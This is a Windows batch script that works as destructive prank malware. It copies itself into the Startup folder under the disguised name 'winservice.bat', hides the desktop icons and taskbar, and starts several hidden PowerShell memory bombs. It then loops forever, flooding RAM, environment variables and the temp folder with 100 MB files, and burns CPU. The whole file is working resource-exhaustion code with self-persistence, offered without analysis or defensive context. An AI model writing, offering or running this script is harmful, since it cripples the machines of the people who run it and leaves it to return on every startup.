@echo off
setlocal enabledelayedexpansion

:: ---------- 🧠 Add to Startup ----------
set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%~f0" "%startupPath%\winservice.bat" >nul 2>&1

:: ---------- 💻 Hide Desktop Icons ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f >nul
taskkill /f /im explorer.exe >nul 2>&1
timeout /t 1 >nul
start explorer.exe

:: ---------- 🪟 Hide Taskbar ----------
powershell -WindowStyle Hidden -Command ^
"$sig = '[DllImport(""user32.dll"")]public static extern int FindWindow(string lpClassName, string lpWindowName);' + `
'[DllImport(""user32.dll"")]public static extern bool ShowWindow(int hWnd, int nCmdShow);'; `
Add-Type -MemberDefinition $sig -Name NativeMethods -Namespace Win32; `
$hwnd = [Win32.NativeMethods]::FindWindow('Shell_TrayWnd', $null); `
[Win32.NativeMethods]::ShowWindow($hwnd, 0)"

:: ---------- 💾 Launch RAM bomb ----------
start "" powershell -WindowStyle Hidden -Command ^
"$a='A'*100000000; while($true){$a+=$a+$a+$a}"

:infinitylag

:: ---------- 🎨 UI Flicker ----------
title ███ SYSTEM OVERLOAD %random%
color 0a & color 0c & color 0e & color 0f

:: ---------- 🧠 Env Variable Spam ----------
for /l %%i in (1,1,3000) do (
    set var%%i=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
)

:: ---------- 🧠 Batch RAM Expansion ----------
set mem=
for /l %%m in (1,1,150) do (
    set mem=!mem!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
)

:: ---------- 💾 Disk Flood ----------
for /l %%f in (1,1,50) do (
    fsutil file createnew "%temp%\LAGFILE_%%random%%.tmp" 100000000 >nul 2>nul
)

:: ---------- 💥 Spawn 6 more RAM bombs ----------
for /l %%x in (1,1,9) do (
    start "" powershell -WindowStyle Hidden -Command "$a='A'*50000000; while($true){$a+=$a+$a}"
)

:: ---------- 🔃 CPU Loop ----------
set /a x=0
for /l %%a in (1,1,999999) do (
    set /a x+=%%a*%%a >nul
)

goto infinitylag
